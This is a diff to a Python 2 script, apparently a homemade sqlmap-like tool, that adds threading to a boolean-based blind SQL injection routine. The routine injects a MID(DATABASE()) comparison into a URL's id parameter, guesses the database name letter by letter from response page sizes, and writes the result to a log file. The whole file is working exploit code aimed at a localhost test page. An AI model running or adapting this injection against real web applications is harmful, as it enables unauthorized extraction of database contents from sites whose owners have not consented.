@@ -8,6 +8,8 @@
 
 import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json
 from difflib import *
+import threading
+from time import ctime,sleep
 
 reload(sys)
 #sys.setdefaultencoding('utf-8')
@@ -46,14 +48,40 @@ def htmlDecode(string):
 		
 	return tmpHtmlEncode
 	
+
+def run(tmpUrl, num, succPageSize, frontThread):
+	
+	if frontThread != None: 
+		frontThread.join()
+
+	ITOA64 = "abcdefghijklmnopqrstuvwxyz"
+	for word in ITOA64:
+
+		newUrl = tmpUrl
+		newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
+
+		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
+		
+		print newUrl
+		
+		if succPageSize == currPageSize:
+			file_object = open('database.log', 'a')
+			file_object.write(word)
+			file_object.close()
+			print '================: ' + word
+			break
+			
+		print "I was listening to %s \r\n" %(ctime())
+		time.sleep(0.1)
+	
 	
 SQLMAP_ROOT_PATH = modulePath()
 KSQL_XML_PATH = os.path.join(SQLMAP_ROOT_PATH, "xml")
 QUERIES_XML = os.path.join(KSQL_XML_PATH, "queries.xml")
 
-ITOA64 = "abcdefghijklmnopqrstuvwxyz"
 
 url = 'http://localhost/test/test.php?id=1&name=kaysen'
+
 
 if os.path.exists('database.log'):
 	os.remove('database.log')
@@ -62,46 +90,43 @@ if os.path.exists('database.log'):
 '''
 	暂时先只处理一个参数
 '''
-values = url.split('?')[-1]
-host = url.split('?')[0]
-tmpUrl = ''
-for key_value in values.split('&'):
-	val = key_value.split('=')
-	tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
+if __name__ == '__main__':
+
+	values = url.split('?')[-1]
+	host = url.split('?')[0]
+	tmpUrl = ''
+	for key_value in values.split('&'):
+		val = key_value.split('=')
+		tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
+		
+		break
+
+
+	''' Blind SQL Injection '''
+	# 成功的页面大小数
+	succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
+	threads = []
+	for num in range(1, 5):
+		#run(tmpUrl, num, succPageSize)
+		
+		if len(threads) == 0:
+			threads.append(threading.Thread(target=run,args=(tmpUrl, num, succPageSize, None)))
+		else:
+			threads.append(threading.Thread(target=run,args=(tmpUrl, num, succPageSize, threads[-1])))
 	
-	break
-
-
-''' Blind SQL Injection '''
-# 成功的页面大小数
-succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
-print succPageSize
-for num in range(1, 5):
-
-	for word in ITOA64:
+	for item in threads:
+		item.setDaemon(True)
+		item.start()
+		
+	item.join()
 	
-		newUrl = tmpUrl
-		newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
 	
-		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
-		
-		print newUrl
-		
-		
-		if succPageSize == currPageSize:
-			file_object = open('database.log', 'a')
-			file_object.write(word)
-			file_object.close()
-			print word
-			break
 
-		time.sleep(0.1)
-		
+	file_object = open('database.log', 'r')
+	try:
+		 all_the_text = file_object.read()
+	finally:
+		 file_object.close()
 
-file_object = open('database.log', 'r')
-try:
-     all_the_text = file_object.read()
-finally:
-     file_object.close()
-
-print 'database: ',all_the_text
+	print 'database: ',all_the_text
+	
